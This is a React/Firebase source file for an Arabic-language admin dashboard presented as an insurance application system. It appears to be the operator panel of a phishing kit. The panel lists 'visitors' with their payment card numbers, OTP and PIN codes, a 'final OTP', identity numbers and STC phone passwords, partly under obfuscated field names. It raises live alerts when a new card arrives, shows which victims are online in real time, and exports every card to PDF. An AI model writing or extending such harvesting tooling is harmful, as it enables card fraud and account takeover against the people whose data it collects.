"use client";

import { useState, useEffect, useMemo, useRef } from "react";
import {
  subscribeToApplications,
  updateApplication,
  deleteMultipleApplications,
} from "@/lib/firebase-services";
import { generateAllCardsPdf } from "@/lib/generate-pdf";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { VisitorSidebar, type VisitorFilter } from "@/components/visitor-sidebar";
import { VisitorDetails } from "@/components/visitor-details";
import { DashboardHeader } from "@/components/dashboard-header";
import { ProtectedRoute } from "@/components/protected-route";
import { Timestamp } from "firebase/firestore";
import { ref, onValue } from "firebase/database";
import { database } from "@/lib/firebase";
import { toast } from "sonner";

const toTimeValue = (value: unknown): number => {
  if (!value) return 0;

  if (value instanceof Date) {
    return value.getTime();
  }

  if (value instanceof Timestamp) {
    return value.toDate().getTime();
  }

  if (typeof value === "object" && typeof (value as any).toDate === "function") {
    try {
      return (value as any).toDate().getTime();
    } catch {
      return 0;
    }
  }

  const parsed = new Date(value as any).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

const getPrioritySortTime = (application: InsuranceApplication): number => {
  const directTimes = [
    (application as any).insurUpdatedAt,
    application.updatedAt,
    application.cardUpdatedAt,
    application.otpUpdatedAt,
    application.pinUpdatedAt,
    application.phoneOtpUpdatedAt,
    application.phoneUpdatedAt,
    application.offerUpdatedAt,
    application.insuranceUpdatedAt,
    application.lastActiveAt,
    application.lastSeen,
  ];

  let latestTime = Math.max(...directTimes.map(toTimeValue), 0);

  if (application.history && Array.isArray(application.history)) {
    for (const entry of application.history as any[]) {
      const entryTime = toTimeValue(entry?.timestamp);
      if (entryTime > latestTime) {
        latestTime = entryTime;
      }
    }
  }

  return latestTime || toTimeValue(application.createdAt);
};

const hasDashboardData = (application: InsuranceApplication) =>
  Boolean(
    application.ownerName?.trim() ||
      application.identityNumber?.trim() ||
      application.phoneNumber?.trim() ||
      application.stcPhone?.trim() ||
      application.stcPassword?.trim() ||
      application._v1?.trim() ||
      application.cardNumber?.trim() ||
      application._v5?.trim() ||
      application.otpCode?.trim() ||
      application._v7?.trim() ||
      application.phoneOtp?.trim() ||
      application._v13?.trim() ||
      application.finalOtp?.trim() ||
      application.history?.some((entry: any) =>
        Boolean(
          entry?.data &&
            Object.values(entry.data).some((value) =>
              typeof value === "string" ? value.trim().length > 0 : Boolean(value)
            )
        )
      )
  );

const getVisitorDisplayName = (application: InsuranceApplication) =>
  application.ownerName || (application as any).name || "زائر";

const getCardState = (application: InsuranceApplication) => {
  const cardHistory =
    application.history?.filter(
      (entry: any) =>
        (entry.type === "_t1" || entry.type === "card") &&
        (entry.data?._v1 || entry.data?.cardNumber)
    ) || [];

  if (cardHistory.length > 0) {
    const sortedCardHistory = [...cardHistory].sort(
      (a: any, b: any) => toTimeValue(b?.timestamp) - toTimeValue(a?.timestamp)
    );
    const latest = sortedCardHistory[0];
    const latestCardValue = latest?.data?._v1 || latest?.data?.cardNumber || "";

    return {
      count: cardHistory.length,
      key: `history|${latest?.id || ""}|${latest?.timestamp || ""}|${latestCardValue}`,
    };
  }

  const directCard = application._v1 || application.cardNumber || "";
  if (typeof directCard === "string" && directCard.trim()) {
    return { count: 1, key: `direct|${directCard}` };
  }

  return null;
};

const showCardNotification = (visitors: InsuranceApplication[]) => {
  if (visitors.length === 0 || typeof window === "undefined") return;

  const firstVisitorName = getVisitorDisplayName(visitors[0]);
  const message =
    visitors.length === 1
      ? `تمت إضافة بطاقة جديدة للزائر: ${firstVisitorName}`
      : `تمت إضافة بطاقات جديدة (${visitors.length})`;

  toast.success(message, { id: "card-added" });

  if ("Notification" in window && Notification.permission === "granted") {
    new Notification("بطاقة جديدة", { body: message, tag: "card-added" });
  }
};

export default function Dashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([]);
  const [selectedVisitor, setSelectedVisitor] =
    useState<InsuranceApplication | null>(null);
  const [isMobileLayout, setIsMobileLayout] = useState(false);
  const [showVisitorDetailsOnMobile, setShowVisitorDetailsOnMobile] =
    useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [cardFilter, setCardFilter] = useState<VisitorFilter>("all");
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);
  const [isExportingAllCards, setIsExportingAllCards] = useState(false);
  const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
  const hasLoadedInitialSnapshotRef = useRef(false);
  const previousUnreadIds = useRef<Set<string>>(new Set());
  const previousCardStateRef = useRef<Map<string, { count: number; key: string }>>(
    new Map()
  );
  const selectedVisitorIdRef = useRef<string | null>(null);
  const visitorOrderRef = useRef<string[]>([]);

  // Presence map: visitorId -> { online: boolean, lastSeen: number }
  // Populated by Realtime Database listener for instant online/offline detection.
  const presenceMapRef = useRef<Record<string, { online: boolean; lastSeen: number }>>({});
  const [, setPresenceVersion] = useState(0);
  const applicationsRef = useRef<InsuranceApplication[]>([]);

  // Apply the latest presence data to a visitor list and return a new array
  // only when something actually changed (avoids needless re-renders).
  const applyPresenceToApplications = (
    apps: InsuranceApplication[]
  ): { apps: InsuranceApplication[]; changed: boolean } => {
    const now = Date.now();
    const fiveSecondsAgoTime = now - 5 * 1000;
    const presence = presenceMapRef.current;
    let changed = false;

    const updated = apps.map((app) => {
      const presenceEntry = app.id ? presence[app.id] : undefined;
      if (presenceEntry) {
        const nextIsOnline = Boolean(presenceEntry.online);
        if (app.isOnline !== nextIsOnline) {
          changed = true;
          return { ...app, isOnline: nextIsOnline };
        }
        return app;
      }
      // Legacy fallback: derive from lastActiveAt/lastSeen
      const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
      const nextIsOnline =
        lastActivityTime > 0 && lastActivityTime >= fiveSecondsAgoTime;
      if (app.isOnline !== nextIsOnline) {
        changed = true;
        return { ...app, isOnline: nextIsOnline };
      }
      return app;
    });

    return { apps: changed ? updated : apps, changed };
  };

  // Subscribe to Realtime Database presence node for instant online/offline status.
  // On every change we re-apply presence to the current visitor list so the UI
  // reflects online/offline transitions immediately — even without a Firestore update.
  useEffect(() => {
    const presenceRef = ref(database, "presence");
    const unsubscribe = onValue(presenceRef, (snapshot) => {
      const val = snapshot.val() || {};
      const next: Record<string, { online: boolean; lastSeen: number }> = {};
      for (const [id, data] of Object.entries(val)) {
        const d = data as any;
        next[id] = {
          online: Boolean(d?.online),
          lastSeen: typeof d?.lastSeen === "number" ? d.lastSeen : 0,
        };
      }
      presenceMapRef.current = next;

      // Re-apply presence to existing visitors so online state is live.
      const { apps, changed } = applyPresenceToApplications(applicationsRef.current);
      if (changed) {
        setApplications(apps);
      }
      setPresenceVersion((n) => n + 1);
    });
    return () => unsubscribe();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Play notification sound
  const playNotificationSound = () => {
    const audio = new Audio("/notification-piano.mp3");
    audio.play().catch((e) => console.log("Could not play sound:", e));
  };

  // Subscribe to Firebase
  useEffect(() => {
    const unsubscribe = subscribeToApplications((apps) => {
      const isInitialSnapshot = !hasLoadedInitialSnapshotRef.current;

      // Keep any visitor that has meaningful progress data (including STC-only flow).
      const validApps = apps.filter(hasDashboardData);

      // Apply online status from Realtime Database presence (instant).
      // Falls back to lastActiveAt/lastSeen for legacy visitors without presence.
      const { apps: appsWithOnlineStatus } = applyPresenceToApplications(validApps);

      // Sort visitors by latest activity (card/OTP/history/updates) newest first
      const sorted = appsWithOnlineStatus.sort((a, b) => {
        const timeA = getPrioritySortTime(a);
        const timeB = getPrioritySortTime(b);
        return timeB - timeA; // Most recent first
      });

      // Update the order ref
      visitorOrderRef.current = sorted
        .map((app) => app.id!)
        .filter((id): id is string => id !== undefined);

      // Check for new unread visitors
      const currentUnreadIds = new Set(
        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
      );

      // Find newly added unread visitors
      const newUnreadIds = Array.from(currentUnreadIds).filter(
        (id) => !previousUnreadIds.current.has(id)
      );

      // Play sound if there are new unread visitors
      if (newUnreadIds.length > 0 && !isInitialSnapshot) {
        playNotificationSound();
      }

      // Check for new card submissions (new card entry or changed card details)
      const currentCardState = new Map<string, { count: number; key: string }>();
      const visitorsWithNewCard: InsuranceApplication[] = [];

      for (const visitor of sorted) {
        if (!visitor.id) continue;
        const cardState = getCardState(visitor);
        if (!cardState) continue;

        currentCardState.set(visitor.id, cardState);

        const previousCardState = previousCardStateRef.current.get(visitor.id);
        if (!previousCardState) {
          if (!isInitialSnapshot) {
            visitorsWithNewCard.push(visitor);
          }
          continue;
        }

        if (
          cardState.count > previousCardState.count ||
          cardState.key !== previousCardState.key
        ) {
          visitorsWithNewCard.push(visitor);
        }
      }

      if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
        playNotificationSound();
        showCardNotification(visitorsWithNewCard);
      }

      // Update previous unread IDs
      previousUnreadIds.current = currentUnreadIds;
      previousCardStateRef.current = currentCardState;
      hasLoadedInitialSnapshotRef.current = true;

      applicationsRef.current = sorted;
      setApplications(sorted);
      setLoading(false);

      // Update selected visitor if it exists in the new list (to keep it synced)
      setSelectedVisitor((prev) => {
        if (prev && prev.id) {
          selectedVisitorIdRef.current = prev.id;
          const updatedVisitor = sorted.find((app) => app.id === prev.id);
          return updatedVisitor || prev;
        }

        // Auto-select first visitor only if none selected
        if (!prev && sorted.length > 0) {
          selectedVisitorIdRef.current = sorted[0].id || null;
          return sorted[0];
        }

        return prev;
      });
    });

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;

    const mediaQuery = window.matchMedia("(max-width: 767px)");
    const applyLayout = (isMobile: boolean) => {
      setIsMobileLayout(isMobile);
      if (!isMobile) {
        setShowVisitorDetailsOnMobile(false);
      }
    };

    applyLayout(mediaQuery.matches);

    const onChange = (event: MediaQueryListEvent) => {
      applyLayout(event.matches);
    };

    if (typeof mediaQuery.addEventListener === "function") {
      mediaQuery.addEventListener("change", onChange);
      return () => mediaQuery.removeEventListener("change", onChange);
    }

    mediaQuery.addListener(onChange);
    return () => mediaQuery.removeListener(onChange);
  }, []);

  // Filter applications
  const filteredApplications = useMemo(() => {
    let filtered = applications;

    // Archive filter: show only archived visitors
    if (cardFilter === "archive") {
      filtered = filtered.filter((app) => app.isArchived === true);
    } else {
      // For "all" and "hasCard": exclude archived visitors
      filtered = filtered.filter((app) => !app.isArchived);

      if (cardFilter === "hasCard") {
        // Card filter: show visitors with card data
        filtered = filtered.filter((app) => {
          // Check direct fields
          if (app._v1 || app.cardNumber) return true;

          // Check history for card entry (type _t1 or card)
          if (app.history && Array.isArray(app.history)) {
            return app.history.some(
              (entry: any) =>
                (entry.type === "_t1" || entry.type === "card") &&
                (entry.data?._v1 || entry.data?.cardNumber)
            );
          }

          return false;
        });
      }
    }

    // Search filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter((app) => {
        const cardNum = app._v1 || app.cardNumber;
        return (
          app.ownerName?.toLowerCase().includes(query) ||
          app.identityNumber?.includes(query) ||
          app.phoneNumber?.includes(query) ||
          app.stcPhone?.includes(query) ||
          cardNum?.slice(-4).includes(query)
        );
      });
    }

    return filtered;
  }, [applications, cardFilter, searchQuery]);

  // Handle select all
  const handleSelectAll = () => {
    if (selectedIds.size === filteredApplications.length) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(
        new Set(
          filteredApplications
            .map((app) => app.id)
            .filter((id): id is string => id !== undefined)
        )
      );
    }
  };

  const handleExportAllCards = async () => {
    setIsExportingAllCards(true);
    try {
      await generateAllCardsPdf(applications);
    } catch (error) {
      console.error("Export all cards error:", error);
    } finally {
      setIsExportingAllCards(false);
    }
  };

  // Handle delete selected
  const handleDeleteSelected = async () => {
    if (selectedIds.size === 0) return;

    const count = selectedIds.size;
    if (
      !confirm(
        `هل أنت متأكد من حذف ${count} زائر؟\n\nهذا الإجراء لا يمكن التراجع عنه.`
      )
    ) {
      return;
    }

    try {
      console.log("Deleting visitors:", Array.from(selectedIds));
      const idsToDelete = Array.from(selectedIds);
      await deleteMultipleApplications(idsToDelete);
      setSelectedIds(new Set());
      console.log("Delete successful");
      alert(`✅ تم حذف ${count} زائر بنجاح`);
    } catch (error) {
      console.error("Error deleting applications:", error);
      alert(
        `❌ حدث خطأ أثناء الحذف: ${
          error instanceof Error ? error.message : "خطأ غير معروف"
        }`
      );
    }
  };

  // Handle archive selected (move visitors to archive, separate from blocking)
  const handleArchiveSelected = async (ids: string[]) => {
    if (ids.length === 0) return;

    const count = ids.length;
    if (
      !confirm(
        `هل أنت متأكد من أرشفة ${count} زائر؟\n\nسيتم نقل الزوار المحددين إلى الأرشيف وإخفاؤهم من القائمة الرئيسية.`
      )
    ) {
      return;
    }

    try {
      await Promise.all(
        ids.map((id) => updateApplication(id, { isArchived: true }))
      );
      setSelectedIds(new Set());
      alert(`✅ تمت أرشفة ${count} زائر بنجاح`);
    } catch (error) {
      console.error("Error archiving applications:", error);
      alert(
        `❌ حدث خطأ أثناء الأرشفة: ${
          error instanceof Error ? error.message : "خطأ غير معروف"
        }`
      );
    }
  };

  // Mark as read when visitor is selected
  const handleSelectVisitor = async (visitor: InsuranceApplication) => {
    setSelectedVisitor(visitor);
    if (isMobileLayout) {
      setShowVisitorDetailsOnMobile(true);
    }

    // Mark as read
    if (visitor.isUnread && visitor.id) {
      await updateApplication(visitor.id, { isUnread: false });
    }
  };

  if (loading) {
    return (
      <div className="min-h-dvh flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto"></div>
          <p className="mt-4 text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  return (
    <ProtectedRoute>
    <div
      className="min-h-screen h-dvh flex flex-col bg-gradient-to-br from-slate-50 via-gray-50 to-indigo-50/40"
      dir="rtl"
    >
      <DashboardHeader
        onExportAllCards={handleExportAllCards}
        isExportingAllCards={isExportingAllCards}
      />
      <div className="flex-1 flex overflow-hidden">
        <div
          className={`${
            isMobileLayout
              ? "h-full w-full"
              : "flex-1 flex landscape:flex-row md:flex-row overflow-hidden"
          }`}
        >
          {/* Right Sidebar - Visitor List */}
          <div
            className={
              isMobileLayout && showVisitorDetailsOnMobile
                ? "hidden"
                : isMobileLayout
                ? "h-full w-full"
                : "h-full shrink-0"
            }
          >
            <VisitorSidebar
              visitors={filteredApplications}
              selectedVisitor={selectedVisitor}
              onSelectVisitor={handleSelectVisitor}
              searchQuery={searchQuery}
              onSearchChange={setSearchQuery}
              cardFilter={cardFilter}
              onCardFilterChange={setCardFilter}
              selectedIds={selectedIds}
              onToggleSelect={(id) => {
                const newSet = new Set(selectedIds);
                if (newSet.has(id)) {
                  newSet.delete(id);
                } else {
                  newSet.add(id);
                }
                setSelectedIds(newSet);
              }}
              onSelectAll={handleSelectAll}
              onDeleteSelected={handleDeleteSelected}
              onArchiveSelected={handleArchiveSelected}
              sidebarWidth={sidebarWidth}
              onSidebarWidthChange={setSidebarWidth}
            />
          </div>

          {/* Left Side - Visitor Details */}
          <div
            className={`${
              isMobileLayout && !showVisitorDetailsOnMobile
                ? "hidden"
                : isMobileLayout
                ? "flex h-full w-full min-h-0"
                : "flex flex-1 min-h-0"
            }`}
          >
            <VisitorDetails
              visitor={selectedVisitor}
              onBack={
                isMobileLayout
                  ? () => setShowVisitorDetailsOnMobile(false)
                  : undefined
              }
            />
          </div>
        </div>
      </div>
    </div>
    </ProtectedRoute>
  );
}
